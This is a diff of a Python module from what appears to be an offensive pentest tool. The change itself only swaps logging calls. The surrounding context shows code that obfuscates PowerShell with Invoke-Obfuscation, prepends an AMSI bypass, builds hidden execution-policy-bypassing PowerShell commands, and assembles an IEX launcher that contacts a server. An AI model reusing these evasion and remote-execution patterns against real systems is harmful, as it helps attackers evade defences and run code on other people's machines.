@@ -37,16 +37,16 @@ def obfs_ps_script(path_to_script):
     if is_powershell_installed() and obfuscate_ps_scripts:
 
         if os.path.exists(obfs_ps_script):
-            logger.info('Using cached obfuscated Powershell script')
+            logger.display('Using cached obfuscated Powershell script')
             with open(obfs_ps_script, 'r') as script:
                 return script.read()
 
-        logger.info('Performing one-time script obfuscation, go look at some memes cause this can take a bit...')
+        logger.display('Performing one-time script obfuscation, go look at some memes cause this can take a bit...')
 
         invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "TOKEN,ALL,1,OUT {}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
                                                                                                                                                  get_ps_script(path_to_script),
                                                                                                                                                  obfs_ps_script)
-        logging.debug(invoke_obfs_command)
+        logger.debug(invoke_obfs_command)
 
         with open(os.devnull, 'w') as devnull:
             return_code = call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)
@@ -107,7 +107,7 @@ else
     else:
         command = amsi_bypass + ps_command
 
-    logging.debug('Generated PS command:\n {}\n'.format(command))
+    logger.debug('Generated PS command:\n {}\n'.format(command))
 
     # We could obfuscate the initial launcher using Invoke-Obfuscation but because this function gets executed concurrently
     # it would spawn a local powershell process per host which isn't ideal, until I figure out a good way of dealing with this 
@@ -128,11 +128,11 @@ else
             invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "ENCODING,{}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
                                                                                                                                               temp.name,
                                                                                                                                               encoding)
-            logging.debug(invoke_obfs_command)
+            logger.debug(invoke_obfs_command)
             out = check_output(invoke_obfs_command, shell=True).split('\n')[4].strip()
 
             command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(out)
-            logging.debug('Command length: {}'.format(len(command)))
+            logger.debug('Command length: {}'.format(len(command)))
 
             if len(command) <= 8192:
                 temp.close()
@@ -243,7 +243,7 @@ $request.GetResponse()'''.format(server=context.server,
                                   command=command)
                                   #second_cmd= second_cmd if second_cmd else '')
 
-    logging.debug('Generated PS IEX Launcher:\n {}\n'.format(launcher))
+    logger.debug('Generated PS IEX Launcher:\n {}\n'.format(launcher))
 
     return launcher.strip()
 
